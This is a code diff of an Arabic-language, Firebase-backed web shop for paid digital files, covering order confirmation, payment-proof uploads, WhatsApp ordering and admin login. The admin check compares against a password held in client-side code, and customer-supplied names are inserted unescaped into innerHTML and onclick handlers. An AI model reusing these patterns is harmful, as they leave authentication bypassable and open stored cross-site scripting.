-                </button>
-                <button class="reject-btn" onclick="rejectOrder('${order.id}')">
-                    <i class="fas fa-times-circle"></i> رفض الطلب
-                </button>` :
-                `<button class="confirm-btn" onclick="sendDownloadNotification('${order.customerName}', '${order.fileId}', '${order.fileName}')">
-                    <i class="fas fa-share"></i> تم التأكيد
-                </button>`;
-            
-            orderCard.innerHTML = `
-                <div class="order-header">
-                    <div class="order-file">${order.fileName}</div>
-                    <div class="order-status ${order.status === 'pending' ? 'status-pending' : 'status-completed'}">
-                        ${order.status === 'pending' ? '⏳ بانتظار التأكيد' : '✅ مكتمل'}
-                    </div>
-                </div>
-                <div class="order-details">
-                    <div class="order-detail">
-                        <span>👤 اسم العميل:</span>
-                        <span>${order.customerName}</span>
-                    </div>
-                    <div class="order-detail">
-                        <span>📅 التاريخ:</span>
-                        <span>${new Date(order.createdAt).toLocaleString('ar-EG')}</span>
-                    </div>
-                    <div class="order-detail">
-                        <span>💰 المبلغ:</span>
-                        <span>${order.filePrice} ج.م</span>
-                    </div>
-                    <div class="order-detail">
-                        <span>📱 معرف الجهاز:</span>
-                        <span style="font-family: monospace; font-size: 0.8rem;">${order.customerDeviceId ? order.customerDeviceId.substring(0, 12) + '...' : 'غير معروف'}</span>
-                    </div>
-                </div>
-                <div class="order-proof">
-                    <p style="font-weight: 700; color: var(--gold); margin-bottom: 10px;">
-                        <i class="fas fa-receipt"></i> إثبات الدفع:
-                    </p>
-                    ${proofContent}
-                </div>
-                ${actionButtons}
-            `;
-            
-            return orderCard;
-        }
-        
-        // تأكيد الطلب
-        async function confirmOrder(orderId, customerName, fileId) {
-            if (!isAdmin) return;
-            
-            showLoading(true);
-            
-            try {
-                // الحصول على بيانات الطلب والملف
-                const orderSnapshot = await ordersRef.child(orderId).once('value');
-                const order = orderSnapshot.val();
-                
-                if (!order) throw new Error('الطلب غير موجود');
-                
-                const fileSnapshot = await filesRef.child(fileId).once('value');
-                const file = fileSnapshot.val();
-                
-                if (!file) throw new Error('الملف غير موجود');
-                
-                // تحديث حالة الطلب
-                await ordersRef.child(orderId).update({
-                    status: 'completed',
-                    confirmedAt: Date.now(),
-                    confirmedBy: currentUser
-                });
-                
-                // إضافة الملف للمستخدم كمشترى
-                await purchasedRef.child(customerName).child(fileId).set(true);
-                
-                // زيادة عداد التحميلات للملف
-                const newDownloads = (file.downloads || 0) + 1;
-                await filesRef.child(fileId).update({ downloads: newDownloads });
-                
-                showNotification('✅ تم تأكيد الطلب بنجاح! يمكن للعميل الآن تحميل الملف.', 'success');
-                
-                // إعادة تحميل البيانات
-                loadOrdersFromFirebase();
-                
-            } catch (error) {
-                showNotification('حدث خطأ أثناء تأكيد الطلب: ' + error.message, 'error');
-            } finally {
-                showLoading(false);
-            }
-        }
-        
-        // رفض الطلب
-        async function rejectOrder(orderId) {
-            if (!isAdmin) return;
-            
-            if (confirm('⚠️ هل أنت متأكد من رفض هذا الطلب؟ سيتم حذف الطلب.')) {
-                showLoading(true);
-                
-                try {
-                    await ordersRef.child(orderId).remove();
-                    showNotification('✅ تم رفض الطلب بنجاح', 'success');
-                } catch (error) {
-                    showNotification('حدث خطأ أثناء رفض الطلب', 'error');
-                } finally {
-                    showLoading(false);
-                }
-            }
-        }
-        
-        // حذف الإثبات
-        async function deleteProof(orderId) {
-            if (!isAdmin) return;
-            
-            if (confirm('⚠️ هل تريد حذف صورة الإثبات؟')) {
-                showLoading(true);
-                
-                try {
-                    const orderSnapshot = await ordersRef.child(orderId).once('value');
-                    const order = orderSnapshot.val();
-                    
-                    if (order && order.proofFileName) {
-                        // حذف الصورة من التخزين
-                        const storageRef = storage.ref();
-                        const proofRef = storageRef.child(`proofs/${order.proofFileName}`);
-                        await proofRef.delete();
-                        
-                        // تحديث الطلب
-                        await ordersRef.child(orderId).update({
-                            proofUrl: null,
-                            proofFileName: null
-                        });
-                        
-                        showNotification('✅ تم حذف صورة الإثبات بنجاح', 'success');
-                    }
-                } catch (error) {
-                    showNotification('حدث خطأ أثناء حذف الإثبات', 'error');
-                } finally {
-                    showLoading(false);
-                }
-            }
-        }
-        
-        // عرض صورة الإثبات
-        function viewProof(orderId) {
-            ordersRef.child(orderId).once('value', (snapshot) => {
-                const order = snapshot.val();
-                if (order && order.proofUrl) {
-                    window.open(order.proofUrl, '_blank', 'width=800,height=600');
+            document.getElementById('filePrice').addEventListener('input', function() {
+                const price = parseInt(this.value) || 0;
+                const isPaidCheckbox = document.getElementById('isPaid');
+                if (price > 0) {
+                    isPaidCheckbox.checked = true;
                 }
             });
-        }
-        
-        // إرسال إشعار التحميل
-        async function sendDownloadNotification(customerName, fileId, fileName) {
-            showNotification(`تم تأكيد طلب ${customerName} لتحميل ${fileName}`, 'success');
-        }
-        
-        // ============================================
-        // نظام إدارة الملفات للمسؤول
-        // ============================================
-        
-        // رفع ملف جديد
-        document.getElementById('fileUploadArea').addEventListener('click', function() {
-            document.getElementById('fileUpload').click();
-        });
-        
-        document.getElementById('fileUpload').addEventListener('change', function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                // التحقق من الحجم
-                if (file.size > 50 * 1024 * 1024) {
-                    showNotification('الملف كبير جداً! الحد الأقصى 50MB', 'error');
-                    return;
+            
+            document.getElementById('isPaid').addEventListener('change', function() {
+                const priceInput = document.getElementById('filePrice');
+                if (!this.checked) {
+                    priceInput.value = 0;
                 }
+            });
+            
+            // إضافة معالجات جديدة
+            document.getElementById('uploadProofBtn').addEventListener('click', function() {
+                document.getElementById('uploadArea').classList.remove('hidden');
+                document.getElementById('paymentProof').click();
+            });
+            
+            document.getElementById('whatsappProofBtn').addEventListener('click', function() {
+                if (!selectedFileForPurchase) return;
                 
-                uploadedFile = file;
-                document.getElementById('fileNameDisplay').textContent = file.name;
-                showNotification('تم اختيار الملف: ' + file.name, 'success');
-            }
-        });
-        
-        // إضافة أو تعديل ملف
-        document.getElementById('fileForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+                const message = `طلب شراء: ${selectedFileForPurchase.name}\n`
+                              + `المبلغ: ${selectedFileForPurchase.price} ج.م\n`
+                              + `اسم المستخدم: ${currentUser}\n`
+                              + `التاريخ: ${new Date().toLocaleString('ar-EG')}`;
+                
+                const whatsappUrl = `https://wa.me/${VODAFONE_NUMBER}?text=${encodeURIComponent(message)}`;
+                window.open(whatsappUrl, '_blank');
+                
+                createOrder(null, 'whatsapp');
+            });
             
-            if (!isAdmin) {
-                showNotification('ليست لديك صلاحية إدارة الملفات', 'error');
-                return;
-            }
-            
-            const fileName = document.getElementById('fileName').value;
-            const fileDescription = document.getElementById('fileDescription').value;
-            const filePrice = parseInt(document.getElementById('filePrice').value) || 0;
-            const isPaid = document.getElementById('isPaid').checked;
-            
-            // التحقق من البيانات
-            if (!fileName || !fileDescription) {
-                showNotification('يرجى ملء جميع الحقول', 'error');
-                return;
-            }
-            
-            // إذا كان مدفوعاً والسعر صفر
-            if (isPaid && filePrice <= 0) {
-                showNotification('الملف مدفوع يجب أن يكون له سعر أكبر من صفر', 'error');
-                return;
-            }
-            
-            showLoading(true);
-            
-            try {
-                if (editingFileId) {
-                    // تعديل ملف موجود
-                    await updateExistingFile(fileName, fileDescription, filePrice, isPaid);
-                } else {
-                    // إضافة ملف جديد
-                    if (!uploadedFile) {
-                        showNotification('يجب رفع ملف حقيقي أولاً', 'error');
-                        showLoading(false);
+            document.getElementById('paymentProof').addEventListener('change', function(e) {
+                const file = e.target.files[0];
+                if (file) {
+                    if (file.size > 5 * 1024 * 1024) {
+                        showNotification('صورة كبيرة جداً! الحد الأقصى 5MB', 'error');
                         return;
                     }
-                    await addNewFile(fileName, fileDescription, filePrice, isPaid);
-                }
-            } catch (error) {
-                showNotification('حدث خطأ: ' + error.message, 'error');
-            } finally {
-                showLoading(false);
-            }
-        });
-        
-        // إضافة ملف جديد
-        async function addNewFile(fileName, fileDescription, filePrice, isPaid) {
-            try {
-                showNotification('جارٍ رفع الملف...', 'info');
-                
-                const storageRef = storage.ref();
-                const fileNameSafe = fileName.replace(/[^a-z0-9]/gi, '_').toLowerCase();
-                const fileRef = storageRef.child(`files/${Date.now()}_${fileNameSafe}_${uploadedFile.name}`);
-                const uploadTask = fileRef.put(uploadedFile);
-                
-                // عرض شريط التقدم
-                const progressContainer = document.getElementById('uploadProgress');
-                const progressBar = document.getElementById('progressBar');
-                progressContainer.style.display = 'block';
-                progressBar.style.width = '0%';
-                
-                uploadTask.on('state_changed',
-                    (snapshot) => {
-                        const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
-                        progressBar.style.width = progress + '%';
-                    },
-                    (error) => {
-                        progressContainer.style.display = 'none';
-                        throw error;
-                    },
-                    async () => {
-                        // الحصول على رابط التحميل
-                        const downloadUrl = await uploadTask.snapshot.ref.getDownloadURL();
-                        
-                        // إنشاء بيانات الملف
-                        const fileType = getFileExtension(uploadedFile.name);
-                        const newFile = {
-                            name: fileName,
-                            description: fileDescription,
-                            price: isPaid ? filePrice : 0,
-                            isPaid: isPaid,
-                            type: fileType,
-                            size: uploadedFile.size,
-                            downloadUrl: downloadUrl,
-                            originalName: uploadedFile.name,
-                            downloads: 0,
-                            isActive: true,
-                            createdAt: Date.now(),
-                            createdBy: currentUser
-                        };
-                        
-                        // حفظ في قاعدة البيانات
-                        const newFileRef = filesRef.push();
-                        await newFileRef.set(newFile);
-                        
-                        // إعادة تعيين النموذج
-                        resetFileForm();
-                        progressContainer.style.display = 'none';
-                        
-                        showNotification('✅ تم إضافة الملف بنجاح!', 'success');
-                        
-                        // تحديث العرض
-                        loadCurrentFilesForAdmin();
-                        loadFilesFromFirebase();
+                    
+                    const validTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/jpg'];
+                    if (!validTypes.includes(file.type)) {
+                        showNotification('نوع الملف غير مدعوم. يسمح فقط بصور JPG, PNG, GIF', 'error');
+                        return;
                     }
-                );
-                
-            } catch (error) {
-                throw error;
-            }
-        }
-        
-        // تحديث ملف موجود
-        async function updateExistingFile(fileName, fileDescription, filePrice, isPaid) {
-            try {
-                const updates = {
-                    name: fileName,
-                    description: fileDescription,
-                    price: isPaid ? filePrice : 0,
-                    isPaid: isPaid,
-                    updatedAt: Date.now(),
-                    updatedBy: currentUser
-                };
-                
-                await filesRef.child(editingFileId).update(updates);
-                
-                // إعادة تعيين النموذج
-                resetFileForm();
-                
-                showNotification('✅ تم تحديث الملف بنجاح!', 'success');
-                
-                // تحديث العرض
-                loadCurrentFilesForAdmin();
-                loadFilesFromFirebase();
-                
-            } catch (error) {
-                throw error;
-            }
-        }
-        
-        // إعادة تعيين نموذج الملف
-        function resetFileForm() {
-            document.getElementById('fileForm').reset();
-            document.getElementById('fileNameDisplay').textContent = '';
-            uploadedFile = null;
-            editingFileId = null;
+                    
+                    proofFile = file;
+                    document.getElementById('proofFileName').textContent = file.name;
+                    
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        document.getElementById('previewImage').src = e.target.result;
+                        document.getElementById('previewContainer').classList.remove('hidden');
+                        document.getElementById('proofStep').scrollIntoView({ behavior: 'smooth' });
+                    };
+                    reader.readAsDataURL(file);
+                    
+                    showNotification('تم اختيار صورة الإثبات بنجاح', 'success');
+                }
+            });
             
-            // إعادة زر الإرسال للنص الأصلي
-            const submitBtn = document.getElementById('submitFileBtn');
-            submitBtn.innerHTML = '<i class="fas fa-cloud-upload-alt"></i> رفع الملف';
-            submitBtn.style.background = 'linear-gradient(45deg, var(--green), #2ECC71)';
+            document.getElementById('submitPayment').addEventListener('click', function() {
+                if (!proofFile) {
+                    showNotification('يرجى رفع إثبات الدفع أولاً', 'error');
+                    return;
+                }
+                createOrder(true, 'image');
+            });
             
-            // إعادة تعيين checkbox
-            document.getElementById('isPaid').checked = false;
+            document.getElementById('fileUploadArea').addEventListener('click', function() {
+                document.getElementById('fileUpload').click();
+            });
+            
+            document.getElementById('fileUpload').addEventListener('change', function(e) {
+                const file = e.target.files[0];
+                if (file) {
+                    if (file.size > 50 * 1024 * 1024) {
+                        showNotification('الملف كبير جداً! الحد الأقصى 50MB', 'error');
+                        return;
+                    }
+                    
+                    uploadedFile = file;
+                    document.getElementById('fileNameDisplay').textContent = file.name;
+                    showNotification('تم اختيار الملف: ' + file.name, 'success');
+                }
+            });
+            
+            document.getElementById('fileForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                if (!isAdmin) {
+                    showNotification('ليست لديك صلاحية إدارة الملفات', 'error');
+                    return;
+                }
+                
+                const fileName = document.getElementById('fileName').value;
+                const fileDescription = document.getElementById('fileDescription').value;
+                const filePrice = parseInt(document.getElementById('filePrice').value) || 0;
+                const isPaid = document.getElementById('isPaid').checked;
+                
+                if (!fileName || !fileDescription) {
+                    showNotification('يرجى ملء جميع الحقول', 'error');
+                    return;
+                }
+                
+                if (isPaid && filePrice <= 0) {
+                    showNotification('الملف مدفوع يجب أن يكون له سعر أكبر من صفر', 'error');
+                    return;
+                }
+                
+                showLoading(true);
+                
+                try {
+                    if (editingFileId) {
+                        await updateExistingFile(fileName, fileDescription, filePrice, isPaid);
+                    } else {
+                        if (!uploadedFile) {
+                            showNotification('يجب رفع ملف حقيقي أولاً', 'error');
+                            showLoading(false);
+                            return;
+                        }
+                        await addNewFile(fileName, fileDescription, filePrice, isPaid);
+                    }
+                } catch (error) {
+                    showNotification('حدث خطأ: ' + error.message, 'error');
+                } finally {
+                    showLoading(false);
+                }
+            });
         }
         
-        // ============================================
+        // العودة للملفات
+        function goBackToFiles() {
+            if (isAdmin) {
+                document.getElementById('filesSection').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'block';
+                document.getElementById('paymentSection').style.display = 'none';
+            } else {
+                document.getElementById('filesSection').style.display = 'block';
+                document.getElementById('adminPanel').style.display = 'none';
+                document.getElementById('paymentSection').style.display = 'none';
+                loadUserPurchasedFiles();
+            }
+            
+            selectedFileForPurchase = null;
+            proofFile = null;
+            document.getElementById('previewContainer').classList.add('hidden');
+            document.getElementById('uploadArea').classList.add('hidden');
+            if (document.getElementById('paymentProof')) {
+                document.getElementById('paymentProof').value = '';
+            }
+            
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+        
         // أدوات مساعدة
-        // ============================================
-        
-        // الحصول على أيقونة الملف
         function getFileIcon(type) {
             const icons = {
                 'pdf': 'fas fa-file-pdf',
@@ -2819,12 +3177,10 @@
             return icons[type] || 'fas fa-file';
         }
         
-        // الحصول على امتداد الملف
         function getFileExtension(filename) {
             return filename.split('.').pop().toLowerCase();
         }
         
-        // الحصول على اسم نوع الملف
         function getFileTypeName(type) {
             const names = {
                 'pdf': 'PDF',
@@ -2850,7 +3206,6 @@
             return names[type] || 'ملف';
         }
         
-        // تنسيق حجم الملف
         function formatFileSize(bytes) {
             if (bytes < 1024) return bytes + ' بايت';
             if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' ك.بايت';
@@ -2858,85 +3213,10 @@
             return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' ج.بايت';
         }
         
-        // العودة للملفات
-        function goBackToFiles() {
-            if (isAdmin) {
-                document.getElementById('filesSection').style.display = 'none';
-                document.getElementById('adminPanel').style.display = 'block';
-                document.getElementById('paymentSection').style.display = 'none';
-            } else {
-                document.getElementById('filesSection').style.display = 'block';
-                document.getElementById('adminPanel').style.display = 'none';
-                document.getElementById('paymentSection').style.display = 'none';
-                
-                // تحميل الملفات المشتراة
-                loadUserPurchasedFiles();
-            }
-            
-            // إعادة تعيين البيانات
-            selectedFileForPurchase = null;
-            proofFile = null;
-            document.getElementById('previewContainer').classList.add('hidden');
-            document.getElementById('uploadArea').classList.add('hidden');
-            if (document.getElementById('paymentProof')) {
-                document.getElementById('paymentProof').value = '';
-            }
-            
-            // تمرير للأعلى
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-        
-        // ============================================
-        // إعداد معالجات الأحداث
-        // ============================================
-        
-        function setupEventListeners() {
-            // العودة للملفات بالضغط على اللوجو
-            document.querySelector('.logo').addEventListener('click', goBackToFiles);
-            
-            // السماح بالدخول بالزر Enter
-            document.getElementById('usernameInput').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    document.getElementById('loginBtn').click();
-                }
-            });
-            
-            // كلمة مرور المسؤول بالزر Enter
-            document.getElementById('adminPassword').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    document.getElementById('loginAdminBtn').click();
-                }
-            });
-            
-            // تحديث حالة checkbox مع تغيير السعر
-            document.getElementById('filePrice').addEventListener('input', function() {
-                const price = parseInt(this.value) || 0;
-                const isPaidCheckbox = document.getElementById('isPaid');
-                
-                if (price > 0) {
-                    isPaidCheckbox.checked = true;
-                }
-            });
-            
-            // تحديث السعر مع تغيير checkbox
-            document.getElementById('isPaid').addEventListener('change', function() {
-                const priceInput = document.getElementById('filePrice');
-                if (!this.checked) {
-                    priceInput.value = 0;
-                }
-            });
-        }
-        
-        // ============================================
-        // نظام العرض والتشغيل
-        // ============================================
-        
-        // عرض الإشعارات
         function showNotification(message, type = 'success') {
             const notification = document.getElementById('notification');
             notification.textContent = message;
             notification.className = `notification ${type}`;
-            
             notification.style.display = 'block';
             
             setTimeout(() => {
@@ -2944,19 +3224,61 @@
             }, 5000);
         }
         
-        // عرض/إخفاء التحميل
         function showLoading(show) {
             const spinner = document.getElementById('loadingSpinner');
             spinner.style.display = show ? 'block' : 'none';
         }
         
+        // تسجيل دخول الأدمن
+        document.getElementById('loginAdminBtn').addEventListener('click', function() {
+            const password = document.getElementById('adminPassword').value;
+            
+            if (password === ADMIN_PASSWORD) {
+                showLoading(true);
+                
+                setTimeout(() => {
+                    isAdmin = true;
+                    currentUser = ADMIN_USERNAME;
+                    saveUserSession();
+                    
+                    document.getElementById('adminLoginModal').style.display = 'none';
+                    document.getElementById('adminPassword').value = '';
+                    
+                    loadFilesFromFirebase();
+                    loadCurrentFilesForAdmin();
+                    loadOrdersFromFirebase();
+                    loadAllUsers();
+                    
+                    showMainContent();
+                    showLoading(false);
+                    showNotification('مرحباً بالمسؤول! 🎯', 'success');
+                }, 800);
+            } else {
+                showNotification('كلمة المرور غير صحيحة! ⚠️', 'error');
+                document.getElementById('adminPassword').value = '';
+                document.getElementById('adminPassword').focus();
+            }
+        });
+        
+        document.getElementById('closeLoginModal').addEventListener('click', function() {
+            document.getElementById('adminLoginModal').style.display = 'none';
+            document.getElementById('adminPassword').value = '';
+        });
+        
+        function showAdminLogin() {
+            document.getElementById('adminLoginModal').style.display = 'flex';
+            document.getElementById('adminPassword').focus();
+        }
+        
+        // تهيئة الجهاز عند التحميل
+        deviceId = generateDeviceId();
+        
         // عند تحميل الصفحة، تحقق من الجلسة
         if (currentUser) {
             loadUserPurchasedFiles();
         }
-        
-        // تهيئة معرف الجهاز
-        deviceId = generateDeviceId();
     </script>
 </body>
 </html>
+        
+        
